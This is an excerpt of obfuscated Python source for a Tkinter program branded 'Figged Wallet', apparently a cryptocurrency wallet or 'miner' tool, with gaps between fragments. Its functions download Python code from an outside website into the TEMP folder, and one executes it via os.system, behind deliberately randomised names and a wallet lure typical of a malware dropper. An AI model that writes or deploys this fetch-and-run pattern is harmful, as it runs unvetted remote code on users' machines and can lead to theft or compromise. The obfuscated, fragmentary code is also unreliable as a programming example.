...
kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb = "Figged Wallet RaaZaY"
...
def gEsXLAQASGrKycEYeWWITUrEHlrZwyfvlTmxsRVmauJjpwarYlebSWnUSyYlFBMa():
    if requests.get("https://www.nextadventure.studio/figgedminer/allFrees.txt").text == "false":
        sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("All frees was disabled")
        return
    with open(os.getenv('TEMP') + "\\freeMiner.py", "w") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(requests.get("https://www.nextadventure.studio/figgedminer/free.txt").text)
...
def AQoTUTJaOqVmaXKzqKNUFnlPHObmhqgAvITKLUfzkEedIyKHjavxpTbAerGkEwkq():
    if requests.get("https://www.nextadventure.studio/figgedminer/allPremiums.txt").text == "false":
        sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("All premiums was disabled")
        return
    with open(os.getenv('TEMP') + "\\premiumMiner.py", "w") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(requests.get("https://www.nextadventure.studio/figgedminer/premium.txt").text)
    os.system("start python %temp%/premiumMiner.py "+tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF)
...
def AqqNVxApSyTKMrJKmXofQYtHadhpqLoyXxWlOwWCMfzmkfQfEZkFagBHkxsTRAlT():
    KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG.set("Api error parse => Address with Amount")
...
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Amount", font=("Courier", 10)).pack()
...
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Address", font=("Courier", 10)).pack()
tk.Entry(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), width=30).pack()
